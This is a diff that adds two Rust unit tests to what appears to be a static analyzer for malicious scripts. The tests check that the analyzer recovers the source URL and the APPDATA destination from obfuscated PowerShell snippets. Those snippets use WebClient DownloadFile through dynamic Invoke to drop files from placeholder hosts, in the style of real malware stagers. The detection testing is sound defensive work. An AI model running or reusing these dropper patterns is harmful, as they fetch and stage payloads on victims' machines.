@@ -14814,6 +14814,51 @@ $clnt.DownloadFile($url,$file)
     }
 
     #[test]
+    fn raw_powershell_dynamic_downloadfile_invoke_preserves_destination() {
+        let script = r#"$clnt = New-Object System.Net.WebClient
+$url = "https://dynamic-downloadfile.example/tool.exe"
+$file = "$env:APPDATA\tool.exe"
+$method = "DownloadFile"
+$clnt.$method.Invoke($url,$file)
+"#;
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://dynamic-downloadfile.example/tool.exe"
+                        && dst.as_deref() == Some("$env:APPDATA\\tool.exe")
+            )
+        });
+        assert!(
+            has,
+            "dynamic DownloadFile.Invoke destination was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn raw_powershell_dynamic_downloadfile_invoke_resolves_chained_env_destination() {
+        let script = r#"$global:nonferociousness=$env:appdata+'\Allitterationers234.Afs'
+$simultantolkedes=$nonferociousness
+$boliganvisninger=New-Object Net.WebClient
+$boliganvisninger.'DownloadFile'.Invoke('https://dynamic-chained-dst.example/stage.txt',$simultantolkedes)
+"#;
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://dynamic-chained-dst.example/stage.txt"
+                        && dst.as_deref() == Some("$env:appdata\\Allitterationers234.Afs")
+            )
+        });
+        assert!(
+            has,
+            "dynamic DownloadFile.Invoke chained env destination was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn raw_powershell_downloadfile_path_combine_destination_extracted() {
         let script = r#"$clnt = New-Object System.Net.WebClient
 $url = "https://download-path-combine.example/setup.exe"
